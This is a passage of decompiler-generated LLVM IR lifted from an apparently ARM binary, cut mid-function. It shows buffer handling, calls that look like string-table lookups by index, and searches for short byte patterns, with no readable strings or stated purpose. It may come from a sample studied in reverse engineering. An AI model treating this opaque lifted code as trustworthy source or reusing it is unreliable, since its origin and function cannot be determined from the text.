  %v0_8dd0 = load i32, i32* @sl, align 4
  %v1_8dd0 = add i32 %v0_8dd0, 660
  %v2_8dd0 = inttoptr i32 %v1_8dd0 to i32*
  %v3_8dd0 = load i32, i32* %v2_8dd0, align 4
  store i32 %v3_8dd0, i32* @r3, align 4
  %v2_8dd4 = sub i32 %v3_8dd0, %v0_8dc8
  store i32 %v2_8dd4, i32* @r4, align 4
  store i32 %v2_8dd4, i32* @r2, align 4
  store i32 %v2_8dd4, i32* %v2_8dd0, align 4
  %v0_8de0 = load i32, i32* @r7, align 4
  %v1_8de0 = load i32, i32* @r6, align 4
  %v2_8de0 = add i32 %v1_8de0, %v0_8de0
  store i32 %v2_8de0, i32* @r1, align 4
  store i32 %v0_8de0, i32* @r0, align 4
  %v3_8de8 = call i32 @function_13670(i32 %v0_8de0, i32 %v2_8de0, i32 %v2_8dd4)
  store i32 %v3_8de8, i32* %r0.global-to-local, align 4
  %v0_8dec = load i32, i32* @sl, align 4
  %v1_8dec = add i32 %v0_8dec, 660
  %v2_8dec = inttoptr i32 %v1_8dec to i32*
  %v3_8dec = load i32, i32* %v2_8dec, align 4
  store i32 %v3_8dec, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8df4 = load i32, i32* %sb.global-to-local, align 4
  %v2_8df4 = add i32 %v0_8df4, %v3_8dec
  store i32 %v2_8df4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8df8 = icmp eq i32 %v3_8dec, 0
  store i1 %v2_8df8, i1* %cpsr_z.global-to-local, align 1
  %v3_8dfc = add i32 %v2_8df4, 2116
  %v4_8dfc = inttoptr i32 %v3_8dfc to i8*
  store i8 0, i8* %v4_8dfc, align 1
  %v0_8e00 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8e00, label %dec_label_pc_8e18, label %dec_label_pc_8e04

dec_label_pc_8e04:                                ; preds = %dec_label_pc_8dd0, %dec_label_pc_8d64
  %v0_8e04 = load i32, i32* @sl, align 4
  %v1_8e04 = add i32 %v0_8e04, 12
  %v2_8e04 = inttoptr i32 %v1_8e04 to i32*
  %v3_8e04 = load i32, i32* %v2_8e04, align 4
  store i32 %v3_8e04, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8e08 = icmp eq i32 %v3_8e04, 0
  store i1 %v2_8e08, i1* %cpsr_z.global-to-local, align 1
  %v5_8e0c = icmp sgt i32 %v3_8e04, 0
  br i1 %v5_8e0c, label %dec_label_pc_8d7c, label %dec_label_pc_8e10

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8e04
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_8da0

dec_label_pc_8e18:                                ; preds = %dec_label_pc_8dc8, %dec_label_pc_8dd0
  %v0_8e18 = load i32, i32* @sl, align 4
  %v1_8e18 = add i32 %v0_8e18, -1448
  %v2_8e18 = inttoptr i32 %v1_8e18 to i8*
  %v3_8e18 = load i8, i8* %v2_8e18, align 1
  %v4_8e18 = zext i8 %v3_8e18 to i32
  store i32 %v4_8e18, i32* %r3.global-to-local, align 4
  %v2_8e1c = icmp ugt i8 %v3_8e18, 6
  store i1 %v2_8e1c, i1* %cpsr_c.global-to-local, align 1
  %v7_8e1c = icmp eq i8 %v3_8e18, 7
  store i1 %v7_8e1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e1c, label %dec_label_pc_8e24, label %dec_label_pc_87ac

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8e18
  %v1_8e24 = add i32 %v0_8e18, 660
  %v2_8e24 = inttoptr i32 %v1_8e24 to i32*
  %v3_8e24 = load i32, i32* %v2_8e24, align 4
  store i32 %v3_8e24, i32* @r3, align 4
  %v2_8e28 = icmp ugt i32 %v3_8e24, 1023
  store i1 %v2_8e28, i1* %cpsr_c.global-to-local, align 1
  %v7_8e28 = icmp eq i32 %v3_8e24, 1024
  store i1 %v7_8e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e28, label %dec_label_pc_8e30.loopexit, label %dec_label_pc_8d34

dec_label_pc_8e30.loopexit:                       ; preds = %dec_label_pc_8e24
  %v0_8e30.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_8e38.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e30

dec_label_pc_8e30:                                ; preds = %dec_label_pc_8e30.loopexit, %dec_label_pc_8d18
  %v0_8e38 = phi i32 [ %v0_8e38.pre, %dec_label_pc_8e30.loopexit ], [ %v1_8d2c, %dec_label_pc_8d18 ]
  %v0_8e30 = phi i32 [ %v0_8e30.pre, %dec_label_pc_8e30.loopexit ], [ %v0_8d20, %dec_label_pc_8d18 ]
  %v1_8e34 = add i32 %v0_8e30, 2180
  store i32 %v1_8e34, i32* @r1, align 4
  store i32 %v0_8e38, i32* @r0, align 4
  store i32 960, i32* @r2, align 4
  %v3_8e40 = call i32 @function_13670(i32 %v0_8e38, i32 %v1_8e34, i32 960)
  store i32 %v3_8e40, i32* %r0.global-to-local, align 4
  %v0_8e44 = load i32, i32* @sl, align 4
  %v1_8e44 = add i32 %v0_8e44, 660
  %v2_8e44 = inttoptr i32 %v1_8e44 to i32*
  %v3_8e44 = load i32, i32* %v2_8e44, align 4
  store i32 %v3_8e44, i32* %r3.global-to-local, align 4
  %v1_8e48 = add i32 %v3_8e44, -64
  store i32 %v1_8e48, i32* @r4, align 4
  store i32 %v1_8e48, i32* %v2_8e44, align 4
  br label %dec_label_pc_8d34

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8d7c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_8e5c = call i32 @function_11b24(i32 36, i32* null)
  %v0_8e60 = load i32, i32* @r4, align 4
  store i32 %v0_8e60, i32* %r1.global-to-local, align 4
  store i32 %v3_8e5c, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_8e6c = load i32, i32* @r7, align 4
  store i32 %v0_8e6c, i32* %r0.global-to-local, align 4
  %v4_8e70 = call i32 @function_12538(i32 %v0_8e6c, i32 %v0_8e60, i32 %v3_8e5c, i32 11)
  store i32 %v4_8e70, i32* %r0.global-to-local, align 4
  %v3_8e74 = icmp eq i32 %v4_8e70, -1
  store i1 %v3_8e74, i1* %cpsr_c.global-to-local, align 1
  %v8_8e74 = icmp eq i32 %v4_8e70, -1
  store i1 %v8_8e74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8e74, label %dec_label_pc_8e7c, label %dec_label_pc_994c

dec_label_pc_8e7c:                                ; preds = %dec_label_pc_8e54
  %v0_8e7c = load i32, i32* @sl, align 4
  %v1_8e7c = add i32 %v0_8e7c, 12
  %v2_8e7c = inttoptr i32 %v1_8e7c to i32*
  %v3_8e7c = load i32, i32* %v2_8e7c, align 4
  store i32 %v3_8e7c, i32* @r5, align 4
  br label %dec_label_pc_8da0

dec_label_pc_8e84:                                ; preds = %dec_label_pc_8da8
  %v0_8e84 = load i32, i32* @r7, align 4
  store i32 %v0_8e84, i32* %r0.global-to-local, align 4
  %v1_8e88 = add i32 %v0_8da8, 660
  %v2_8e88 = inttoptr i32 %v1_8e88 to i32*
  %v3_8e88 = load i32, i32* %v2_8e88, align 4
  store i32 %v3_8e88, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8e94 = call i32 @function_12538(i32 %v0_8e84, i32 %v3_8e88, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2)
  store i32 %v5_8e94, i32* %r0.global-to-local, align 4
  %v2_8e98 = icmp eq i32 %v5_8e94, -1
  store i1 %v2_8e98, i1* %cpsr_c.global-to-local, align 1
  %v7_8e98 = icmp eq i32 %v5_8e94, -1
  store i1 %v7_8e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8e98, label %dec_label_pc_8dc8, label %dec_label_pc_8ea0

dec_label_pc_8ea0:                                ; preds = %dec_label_pc_8e84
  %v0_8ea0 = load i32, i32* @sl, align 4
  %v1_8ea0 = add i32 %v0_8ea0, 660
  %v2_8ea0 = inttoptr i32 %v1_8ea0 to i32*
  %v3_8ea0 = load i32, i32* %v2_8ea0, align 4
  store i32 %v3_8ea0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_8eac = load i32, i32* @r7, align 4
  store i32 %v0_8eac, i32* %r0.global-to-local, align 4
  %v5_8eb0 = call i32 @function_12538(i32 %v0_8eac, i32 %v3_8ea0, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2)
  %v0_8eb4 = load i32, i32* %sb.global-to-local, align 4
  %v2_8eb4 = add i32 %v0_8eb4, %v5_8eb0
  store i32 %v2_8eb4, i32* %ip.global-to-local, align 4
  store i32 %v5_8eb0, i32* @r6, align 4
  store i32 %v5_8eb0, i32* %r1.global-to-local, align 4
  %v0_8ec0 = load i32, i32* @r7, align 4
  store i32 %v0_8ec0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1852c.36 to i32), i32* %r2.global-to-local, align 4
  %v0_8ec8 = load i32, i32* @r4, align 4
  store i32 %v0_8ec8, i32* %r3.global-to-local, align 4
  %v0_8ecc = load i32, i32* @r5, align 4
  %v1_8ecc = trunc i32 %v0_8ecc to i8
  %v3_8ecc = add i32 %v2_8eb4, 2114
  %v4_8ecc = inttoptr i32 %v3_8ecc to i8*
  store i8 %v1_8ecc, i8* %v4_8ecc, align 1
  %v4_8ed0 = call i32 @function_12538(i32 %v0_8ec0, i32 %v5_8eb0, i32 ptrtoint (i32* @global_var_1852c.36 to i32), i32 %v0_8ec8)
  store i32 %v4_8ed0, i32* %r0.global-to-local, align 4
  %v2_8ed4 = icmp eq i32 %v4_8ed0, -1
  store i1 %v2_8ed4, i1* %cpsr_c.global-to-local, align 1
  %v7_8ed4 = icmp eq i32 %v4_8ed0, -1
  store i1 %v7_8ed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ed4, label %dec_label_pc_8ef8, label %dec_label_pc_8edc

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ea0
  %v0_8edc = load i32, i32* @r7, align 4
  store i32 %v0_8edc, i32* %r0.global-to-local, align 4
  %v0_8ee0 = load i32, i32* @r6, align 4
  store i32 %v0_8ee0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1852c.36 to i32), i32* %r2.global-to-local, align 4
  %v0_8ee8 = load i32, i32* @r4, align 4
  store i32 %v0_8ee8, i32* %r3.global-to-local, align 4
  %v4_8eec = call i32 @function_12538(i32 %v0_8edc, i32 %v0_8ee0, i32 ptrtoint (i32* @global_var_1852c.36 to i32), i32 %v0_8ee8)
  %v0_8ef0 = load i32, i32* %sb.global-to-local, align 4
  %v2_8ef0 = add i32 %v0_8ef0, %v4_8eec
  store i32 %v2_8ef0, i32* %r0.global-to-local, align 4
  %v0_8ef4 = load i32, i32* @r5, align 4
  %v1_8ef4 = trunc i32 %v0_8ef4 to i8
  %v3_8ef4 = add i32 %v2_8ef0, 2116
  %v4_8ef4 = inttoptr i32 %v3_8ef4 to i8*
  store i8 %v1_8ef4, i8* %v4_8ef4, align 1
  br label %dec_label_pc_8ef8

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ea0, %dec_label_pc_8edc
  %v0_8ef8 = load i32, i32* @r7, align 4
  store i32 %v0_8ef8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_8f00 = inttoptr i32 %v0_8ef8 to i8*
  %v3_8f00 = call i32 @function_125a4(i8* %v2_8f00, i32 16)
  store i32 %v3_8f00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8f04 = icmp eq i32 %v3_8f00, 0
  store i1 %v2_8f04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f04, label %dec_label_pc_9b00, label %dec_label_pc_8f0c

dec_label_pc_8f0c:                                ; preds = %dec_label_pc_8ef8
  %v1_8f0c = add i32 %v3_8f00, 2
  store i32 %v1_8f0c, i32* %r3.global-to-local, align 4
  %v1_8f10 = load i32, i32* @sl, align 4
  %v2_8f10 = add i32 %v1_8f10, 12
  %v3_8f10 = inttoptr i32 %v2_8f10 to i32*
  store i32 %v1_8f0c, i32* %v3_8f10, align 4
  br label %dec_label_pc_8dc8

dec_label_pc_8f18:                                ; preds = %dec_label_pc_8584
  %v2_8f18 = inttoptr i32 %v1_85d8 to i32*
  %v3_8f18 = load i32, i32* %v2_8f18, align 4
  store i32 %v3_8f18, i32* %ip.global-to-local, align 4
  %v3_8f20 = udiv i32 %v3_8f18, 32
  %v3_8f24 = mul nuw nsw i32 %v3_8f20, 4
  store i32 %v2_86d0, i32* @lr, align 4
  %v2_8f2c = add i32 %v3_8f24, %v2_86d0
  store i32 %v2_8f2c, i32* %r2.global-to-local, align 4
  %v1_8f30 = add i32 %v2_8f2c, -164
  %v2_8f30 = inttoptr i32 %v1_8f30 to i32*
  %v3_8f30 = load i32, i32* %v2_8f30, align 4
  %v1_8f34 = urem i32 %v3_8f18, 32
  store i32 %v1_8f34, i32* %r0.global-to-local, align 4
  store i32 %v1_857c, i32* %r3.global-to-local, align 4
  %v7_8f3c = shl i32 %v1_857c, %v1_8f34
  %v8_8f3c = or i32 %v3_8f30, %v7_8f3c
  store i32 %v8_8f3c, i32* %r1.global-to-local, align 4
  %v1_8f40 = load i32, i32* @r8, align 4
  %v2_8f40 = sub i32 %v3_8f18, %v1_8f40
  %v3_8f40 = icmp uge i32 %v3_8f18, %v1_8f40
  store i1 %v3_8f40, i1* %cpsr_c.global-to-local, align 1
  %v4_8f40 = xor i32 %v1_8f40, %v3_8f18
  %v5_8f40 = xor i32 %v2_8f40, %v3_8f18
  %v6_8f40 = and i32 %v5_8f40, %v4_8f40
  %v7_8f40 = icmp slt i32 %v6_8f40, 0
  %v8_8f40 = icmp slt i32 %v2_8f40, 0
  %v9_8f40 = icmp eq i32 %v3_8f18, %v1_8f40
  store i1 %v9_8f40, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8f3c, i32* %v2_8f30, align 4
  %v3_8f48 = xor i1 %v8_8f40, %v7_8f40
  %v4_8f48 = or i1 %v9_8f40, %v3_8f48
  br i1 %v4_8f48, label %dec_label_pc_85b4, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f18
  %v0_8f4c = load i32, i32* %ip.global-to-local, align 4
  %v1_8f4c = load i32, i32* %r3.global-to-local, align 4
  %v2_8f4c = add i32 %v1_8f4c, %v0_8f4c
  store i32 %v2_8f4c, i32* @r8, align 4
  br label %dec_label_pc_86f8

dec_label_pc_8f54:                                ; preds = %dec_label_pc_8808
  store i32 %v3_884c, i32* %r0.global-to-local, align 4
  %v1_8f58 = call i32 @function_1314c(i32 %v3_884c)
  store i32 %v1_8f58, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_8f60 = load i32, i32* @sl, align 4
  %v2_8f60 = add i32 %v1_8f60, -1452
  %v3_8f60 = inttoptr i32 %v2_8f60 to i32*
  store i32 -1, i32* %v3_8f60, align 4
  %v0_8f64 = load i32, i32* @r5, align 4
  %v1_8f64 = trunc i32 %v0_8f64 to i8
  %v2_8f64 = load i32, i32* @sl, align 4
  %v3_8f64 = add i32 %v2_8f64, -1448
  %v4_8f64 = inttoptr i32 %v3_8f64 to i8*
  store i8 %v1_8f64, i8* %v4_8f64, align 1
  br label %dec_label_pc_87ac

dec_label_pc_8f6c:                                ; preds = %dec_label_pc_858c
  %v2_8f6c = inttoptr i32 %v1_85d8 to i32*
  %v3_8f6c = load i32, i32* %v2_8f6c, align 4
  store i32 %v3_8f6c, i32* %ip.global-to-local, align 4
  %v3_8f74 = udiv i32 %v3_8f6c, 32
  store i32 %v2_86d0, i32* %r1.global-to-local, align 4
  %v3_8f7c = mul nuw nsw i32 %v3_8f74, 4
  %v2_8f80 = add i32 %v3_8f7c, %v2_86d0
  store i32 %v2_8f80, i32* %r2.global-to-local, align 4
  %v1_8f84 = add i32 %v2_8f80, -164
  %v2_8f84 = inttoptr i32 %v1_8f84 to i32*
  %v3_8f84 = load i32, i32* %v2_8f84, align 4
  %v1_8f88 = urem i32 %v3_8f6c, 32
  store i32 %v1_8f88, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8f90 = shl i32 1, %v1_8f88
  %v8_8f90 = or i32 %v3_8f84, %v7_8f90
  store i32 %v8_8f90, i32* %r1.global-to-local, align 4
  %v1_8f94 = load i32, i32* @r8, align 4
  %v2_8f94 = sub i32 %v3_8f6c, %v1_8f94
  %v3_8f94 = icmp uge i32 %v3_8f6c, %v1_8f94
  store i1 %v3_8f94, i1* %cpsr_c.global-to-local, align 1
  %v4_8f94 = xor i32 %v1_8f94, %v3_8f6c
  %v5_8f94 = xor i32 %v2_8f94, %v3_8f6c
  %v6_8f94 = and i32 %v5_8f94, %v4_8f94
  %v7_8f94 = icmp slt i32 %v6_8f94, 0
  %v8_8f94 = icmp slt i32 %v2_8f94, 0
  %v9_8f94 = icmp eq i32 %v3_8f6c, %v1_8f94
  store i1 %v9_8f94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8f90, i32* %v2_8f84, align 4
  %v3_8f9c = xor i1 %v8_8f94, %v7_8f94
  %v4_8f9c = or i1 %v9_8f94, %v3_8f9c
  br i1 %v4_8f9c, label %dec_label_pc_85b4, label %dec_label_pc_8fa0

dec_label_pc_8fa0:                                ; preds = %dec_label_pc_8f6c
  %v0_8fa0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8fa0 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fa0 = add i32 %v1_8fa0, %v0_8fa0
  store i32 %v2_8fa0, i32* @r8, align 4
  br label %dec_label_pc_86f8

dec_label_pc_8fe8:                                ; preds = %dec_label_pc_8790
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  %v2_8ff0 = call i32 @function_12514(i32 %v2_823c, i32 10240)
  store i32 %v2_8ff0, i32* %r0.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v0_8ffc = load i32, i32* @sl, align 4
  %v1_8ffc = add i32 %v0_8ffc, -1452
  %v2_8ffc = inttoptr i32 %v1_8ffc to i32*
  %v3_8ffc = load i32, i32* %v2_8ffc, align 4
  store i32 %v3_8ffc, i32* %r0.global-to-local, align 4
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v4_9008 = call i32 @function_13810(i32 %v3_8ffc, i32 %v2_823c, i32 10240, i32 16386)
  store i32 %v4_9008, i32* %r0.global-to-local, align 4
  store i32 %v4_9008, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9010 = icmp eq i32 %v4_9008, 0
  store i1 %v2_9010, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r7, align 4
  %tmp181 = icmp slt i32 %v4_9008, 1
  br i1 %tmp181, label %dec_label_pc_9510, label %dec_label_pc_901c

dec_label_pc_901c:                                ; preds = %dec_label_pc_8fe8
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  store i32 %v4_9008, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18524.38 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_902c = call i32 @function_12538(i32 %v2_823c, i32 %v4_9008, i32 ptrtoint ([5 x i8]* @global_var_18524.38 to i32), i32 4)
  store i32 %v5_902c, i32* %r0.global-to-local, align 4
  %v3_9030 = icmp eq i32 %v5_902c, -1
  store i1 %v3_9030, i1* %cpsr_c.global-to-local, align 1
  %v8_9030 = icmp eq i32 %v5_902c, -1
  store i1 %v8_9030, i1* %cpsr_z.global-to-local, align 1
  %v0_9038 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v3_9030, label %dec_label_pc_9038, label %dec_label_pc_9040

dec_label_pc_9038:                                ; preds = %dec_label_pc_901c
  %v3_9038 = icmp ugt i32 %v0_9038, 10239
  store i1 %v3_9038, i1* %cpsr_c.global-to-local, align 1
  %v8_9038 = icmp eq i32 %v0_9038, 10240
  store i1 %v8_9038, i1* %cpsr_z.global-to-local, align 1
  %v5_903c = icmp slt i32 %v0_9038, 10240
  br i1 %v5_903c, label %dec_label_pc_87ac, label %dec_label_pc_9040

dec_label_pc_9040:                                ; preds = %dec_label_pc_901c, %dec_label_pc_9038
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18524.38 to i32), i32* %r2.global-to-local, align 4
  store i32 %v0_9038, i32* %r1.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v5_9050 = call i32 @function_12538(i32 %v2_823c, i32 %v0_9038, i32 ptrtoint ([5 x i8]* @global_var_18524.38 to i32), i32 4)
  store i32 %v2_823c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v4_905c = add i32 %v5_9050, %v2_823c
  %v5_905c = inttoptr i32 %v4_905c to i8*
  store i8 0, i8* %v5_905c, align 1
  %v0_9060 = load i32, i32* @r5, align 4
  store i32 %v0_9060, i32* %r1.global-to-local, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_9068 = inttoptr i32 %v0_9060 to i32*
  %v3_9068 = call i32 @function_11b24(i32 46, i32* %v2_9068)
  %v0_906c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_906c, i32* @r1, align 4
  store i32 %v3_9068, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_9078 = call i32 @function_127d0(i8* %tmp168, i32 %v0_906c, i32 %v3_9068)
  store i32 %v4_9078, i32* %r0.global-to-local, align 4
  %v2_907c = icmp eq i32 %v4_9078, -1
  store i1 %v2_907c, i1* %cpsr_c.global-to-local, align 1
  %v7_907c = icmp eq i32 %v4_9078, -1
  store i1 %v7_907c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_907c, label %.thread23, label %bb182

bb182:                                            ; preds = %dec_label_pc_9040
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_9084 = load i32, i32* @sl, align 4
  %v3_9084 = inttoptr i32 %v2_9084 to i32*
  store i32 2, i32* %v3_9084, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_9040, %bb182
  %v0_9088 = load i32, i32* @r5, align 4
  store i32 %v0_9088, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_9090 = inttoptr i32 %v0_9088 to i32*
  %v3_9090 = call i32 @function_11b24(i32 45, i32* %v2_9090)
  %v0_9094 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9094, i32* @r1, align 4
  store i32 %v3_9090, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_90a0 = call i32 @function_127d0(i8* %tmp168, i32 %v0_9094, i32 %v3_9090)
  store i32 %v4_90a0, i32* %r0.global-to-local, align 4
  %v2_90a4 = icmp eq i32 %v4_90a0, -1
  store i1 %v2_90a4, i1* %cpsr_c.global-to-local, align 1
  %v7_90a4 = icmp eq i32 %v4_90a0, -1
  store i1 %v7_90a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90a4, label %.thread24, label %bb183

bb183:                                            ; preds = %.thread23
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_90ac = load i32, i32* @sl, align 4
  %v3_90ac = inttoptr i32 %v2_90ac to i32*
  store i32 1, i32* %v3_90ac, align 4
  br label %.thread24

.thread24:                                        ; preds = %.thread23, %bb183
  %v0_90b0 = load i32, i32* @r5, align 4
  store i32 %v0_90b0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_90b8 = load i32, i32* @sl, align 4
  %v2_90b8 = add i32 %v1_90b8, 4
  %v3_90b8 = inttoptr i32 %v2_90b8 to i32*
  store i32 %v0_90b0, i32* %v3_90b8, align 4
  %v2_90bc = inttoptr i32 %v0_90b0 to i32*
  %v3_90bc = call i32 @function_11b24(i32 44, i32* %v2_90bc)
  %v0_90c0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90c0, i32* @r1, align 4
  store i32 %v3_90bc, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_90cc = call i32 @function_127d0(i8* %tmp168, i32 %v0_90c0, i32 %v3_90bc)
  store i32 %v4_90cc, i32* %r0.global-to-local, align 4
  %v2_90d0 = icmp eq i32 %v4_90cc, -1
  store i1 %v2_90d0, i1* %cpsr_c.global-to-local, align 1
  %v7_90d0 = icmp eq i32 %v4_90cc, -1
  store i1 %v7_90d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90d0, label %.thread25, label %dec_label_pc_90d8

dec_label_pc_90d8:                                ; preds = %.thread24
  %v0_90d8 = load i32, i32* @r5, align 4
  store i32 %v0_90d8, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_90e0 = inttoptr i32 %v0_90d8 to i32*
  %v3_90e0 = call i32 @function_11b24(i32 44, i32* %v2_90e0)
  %v0_90e4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90e4, i32* @r1, align 4
  store i32 %v3_90e0, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_90f0 = call i32 @function_127d0(i8* %tmp168, i32 %v0_90e4, i32 %v3_90e0)
  store i32 %v4_90f0, i32* %r0.global-to-local, align 4
  store i32 %v2_823c, i32* @lr, align 4
  %v2_90f8 = add i32 %v4_90f0, %v2_823c
  %v3_90f8 = inttoptr i32 %v2_90f8 to i8*
  %v4_90f8 = load i8, i8* %v3_90f8, align 1
  %v2_9100 = icmp ugt i8 %v4_90f8, 31
  store i1 %v2_9100, i1* %cpsr_c.global-to-local, align 1
  %v7_9100 = icmp eq i8 %v4_90f8, 32
  store i1 %v7_9100, i1* %cpsr_z.global-to-local, align 1
  %v2_9108 = zext i1 %v7_9100 to i32
  %v2_9108.v4_90f0 = add i32 %v2_9108, %v4_90f0
  store i32 %v2_9108.v4_90f0, i32* @r4, align 4
  %v2_910c = add i32 %v2_9108.v4_90f0, %v2_823c
  store i32 %v2_910c, i32* @r6, align 4
  store i32 %v2_910c, i32* %r0.global-to-local, align 4
  %v1_9114 = load i32, i32* %fp.global-to-local, align 4
  %v2_9114 = sub i32 %v1_9114, %v2_9108.v4_90f0
  store i32 %v2_9114, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9120 = call i32 @function_12538(i32 %v2_910c, i32 %v2_9114, i32 ptrtoint ([3 x i8]* @global_var_18500.30 to i32), i32 2)
  store i32 %v5_9120, i32* %r0.global-to-local, align 4
  %v2_9124 = icmp eq i32 %v5_9120, -1
  store i1 %v2_9124, i1* %cpsr_c.global-to-local, align 1
  %v7_9124 = icmp eq i32 %v5_9120, -1
  store i1 %v7_9124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9124, label %.thread25, label %dec_label_pc_912c

dec_label_pc_912c:                                ; preds = %dec_label_pc_90d8
  %v2_912c = icmp ne i32 %v5_9120, 0
  store i1 %v2_912c, i1* %cpsr_c.global-to-local, align 1
  %v7_912c = icmp eq i32 %v5_9120, 1
  store i1 %v7_912c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8654, i32* %r2.global-to-local, align 4
  %v7_9134 = icmp slt i32 %v5_9120, 2
  br i1 %v7_9134, label %bb185, label %bb184

bb184:                                            ; preds = %dec_label_pc_912c
  %v9_9134 = add i32 %v5_9120, -2
  store i32 %v9_9134, i32* %r0.global-to-local, align 4
  br label %bb185

bb185:                                            ; preds = %dec_label_pc_912c, %bb184
  %v1_913c = phi i32 [ %v5_9120, %dec_label_pc_912c ], [ %v9_9134, %bb184 ]
  store i32 %v2_86d0, i32* %r2.global-to-local, align 4
  %v2_913c = add i32 %v1_913c, %v2_86d0
  %v1_9140 = load i32, i32* @r4, align 4
  %v2_9140 = add i32 %v2_913c, %v1_9140
  store i32 %v2_9140, i32* %r3.global-to-local, align 4
  %v0_9144 = load i32, i32* @r5, align 4
  %v1_9144 = trunc i32 %v0_9144 to i8
  %v3_9144 = load i32, i32* @r7, align 4
  %v4_9144 = add i32 %v3_9144, %v2_9140
  %v5_9144 = inttoptr i32 %v4_9144 to i8*
  store i8 %v1_9144, i8* %v5_9144, align 1
  %v0_9148 = load i32, i32* @r6, align 4
  store i32 %v0_9148, i32* %r0.global-to-local, align 4
  %v1_914c = inttoptr i32 %v0_9148 to i8*
  %v2_914c = call i32 @function_12480(i8* %v1_914c)
  %v0_9150 = load i32, i32* @r5, align 4
  store i32 %v0_9150, i32* %r1.global-to-local, align 4
  store i32 %v2_914c, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_915c = inttoptr i32 %v0_9150 to i32*
  %v3_915c = call i32 @function_11b24(i32 43, i32* %v2_915c)
  %v0_9160 = load i32, i32* @r4, align 4
  store i32 %v0_9160, i32* @r1, align 4
  store i32 %v3_915c, i32* %r2.global-to-local, align 4
